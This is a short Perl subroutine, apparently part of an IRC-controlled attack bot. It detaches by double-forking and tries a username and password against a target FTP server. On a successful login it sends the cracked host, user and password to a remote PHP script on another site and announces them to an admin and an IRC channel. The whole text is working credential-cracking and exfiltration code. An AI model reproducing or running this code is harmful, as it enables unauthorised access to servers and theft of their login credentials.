sub ftp() {
	my $host = $_[0];
	my $user = $_[1];
	my $pass = $_[2];
	my $chan = $_[3];
		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
			my $success = 1;
			use Net::FTP;
			my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);
			$success = 0 if $ftp->login($user,$pass);
			$ftp->quit;
			if ($success == 0) {
			my $sent = "http://".$site."images/stories/kliverz.php?cpanel&site=".$site."?user=".$user."?pass=".$pass;
			&get_content($sent);
				&msg("$admin","4,1 [8FTP4] [ 8host : ".$host." 4] [ 8login : ".$user." 4] [ 8pass : ".$pass." 4] 8Success ");
				&msg("$chan","4,1 [8FTP4] Found on 8http://$host ");
			}
		} exit;
	}
}
